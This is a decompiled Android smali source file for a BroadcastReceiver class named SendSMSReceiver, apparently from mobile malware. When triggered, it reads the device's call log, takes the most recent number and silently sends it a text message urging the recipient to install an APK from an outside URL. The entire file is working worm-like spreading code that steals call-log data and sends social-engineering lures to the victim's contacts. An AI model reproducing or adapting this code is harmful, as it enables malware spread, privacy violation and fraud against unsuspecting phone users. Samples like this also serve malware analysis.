.class public Landroid/ares/SendSMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SendSMSReceiver.java"


# static fields
.field private static final MESSAGE:Ljava/lang/String; = "Yo, I forgot to tell you to install this app: http://www.paintedostrich.com/discounts.apk"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .registers 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "phoneNumber"    # Ljava/lang/String;
    .param p3, "message"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    const/4 v3, 0x0

    .line 55
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    invoke-static {p1, v3, v1, v3}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 56
    .local v4, "pIntent":Landroid/app/PendingIntent;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .local v0, "SMS":Landroid/telephony/SmsManager;
    move-object v1, p2

    move-object v3, p3

    move-object v5, v2

    .line 57
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 60
    const-string v1, "::trace"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "::INFO  SMS sent to "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 61
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v3, 0x0

    .line 27
    const/4 v0, 0x2

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "number"

    aput-object v1, v2, v0

    const/4 v0, 0x1

    .line 28
    const-string v1, "name"

    aput-object v1, v2, v0

    .line 29
    .local v2, "strFields":[Ljava/lang/String;
    const-string v5, "date DESC"

    .line 31
    .local v5, "strOrder":Ljava/lang/String;
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 32
    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    move-object v4, v3

    .line 31
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 39
    .local v6, "cursor":Landroid/database/Cursor;
    :try_start_1b
    invoke-interface {v6}, Landroid/database/Cursor;->moveToFirst()Z

    .line 42
    const-string v0, "number"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    .line 41
    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 43
    .local v8, "phoneNumber":Ljava/lang/String;
    const-string v0, "Yo, I forgot to tell you to install this app: http://www.paintedostrich.com/discounts.apk"

    invoke-direct {p0, p1, v8, v0}, Landroid/ares/SendSMSReceiver;->sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2d
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_2d} :catch_39
    .catchall {:try_start_1b .. :try_end_2d} :catchall_5e

    .line 48
    if-eqz v6, :cond_38

    invoke-interface {v6}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_38

    .line 49
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 51
    .end local v8    # "phoneNumber":Ljava/lang/String;
    :cond_38
    :goto_38
    return-void

    .line 44
    :catch_39
    move-exception v7

    .line 46
    .local v7, "e":Ljava/lang/Exception;
    :try_start_3a
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "::ERROR  "

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v7}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_52
    .catchall {:try_start_3a .. :try_end_52} :catchall_5e

    .line 48
    if-eqz v6, :cond_38

    invoke-interface {v6}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_38

    .line 49
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    goto :goto_38

    .line 47
    .end local v7    # "e":Ljava/lang/Exception;
    :catchall_5e
    move-exception v0

    .line 48
    if-eqz v6, :cond_6a

    invoke-interface {v6}, Landroid/database/Cursor;->isClosed()Z

    move-result v1

    if-nez v1, :cond_6a

    .line 49
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 50
    :cond_6a
    throw v0
.end method
